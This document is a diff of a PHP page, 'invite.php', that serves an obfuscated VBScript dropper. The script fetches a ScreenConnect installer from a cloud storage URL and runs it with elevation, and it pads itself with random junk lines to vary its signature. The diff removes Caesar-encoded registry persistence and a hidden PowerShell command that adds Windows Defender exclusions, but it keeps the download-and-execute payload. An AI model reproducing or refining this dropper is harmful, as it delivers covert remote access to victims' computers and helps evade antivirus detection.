@@ -1,5 +1,5 @@
 <?php
-// invite.php - Improved Elevation + runas 0
+// invite.php - No Persistence + No Defender Exclusion + ~1KB size variation
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
@@ -35,13 +35,13 @@ $scUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetu
 $sessionId = bin2hex(random_bytes(24));
 $ts = time();
 $randV1 = 'v' . substr(md5(random_bytes(8)), 0, 12);
-$randFunc = 'f' . substr(md5(random_bytes(8)), 0, 10);
 $xorKey = rand(100, 255);
 
-$junkLines = rand(12, 45);
+// Max ~1 KB difference
+$junkLines = rand(5, 25);
 $junk = "";
 for ($i = 0; $i < $junkLines; $i++) {
-    $junk .= "' Junk " . bin2hex(random_bytes(rand(8, 22))) . "\n";
+    $junk .= "' Junk " . bin2hex(random_bytes(rand(6, 14))) . "\n";
 }
 
 echo <<<VBS
@@ -69,18 +69,12 @@ If WScript.Arguments.Length = 0 Then
     WScript.Quit
 End If
 
-Sub AddToStartup()
-    On Error Resume Next
-    objShell.RegWrite D("ILDV\\Tpguxbsf\\Njdsptpgu\\Xjoepxt\\DvssfouWfsjpo\\Svo\\XjoepxtVqebufIfmqfs"), _
-        WScript.ScriptFullName, "REG_SZ"
-End Sub
-
 Sub DownloadAndExecute()
     On Error Resume Next
     Dim u, p, http, strm
     u = "$scUrl"
     p = objShell.ExpandEnvironmentStrings("%TEMP%\\sc_setup.msi")
-   
+  
     Set http = CreateObject("MSXML2.XMLHTTP")
     http.Open "GET", u, False
     http.Send
@@ -93,16 +87,10 @@ Sub DownloadAndExecute()
     End If
 End Sub
 
-Sub HideAgent()
-    On Error Resume Next
-    objShell.Run D("qpxfstifmm -NoProfile -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath 'C:\\Program Files (x86)\\ScreenConnect Client*'; Add-MpPreference -ExclusionProcess 'ScreenConnect*.exe'"""), 0, True
-End Sub
-
 ' ===== MAIN =====
-Call AddToStartup
 Call DownloadAndExecute
-Call HideAgent
 
+$junk
 WScript.Quit
 VBS;
 ?>
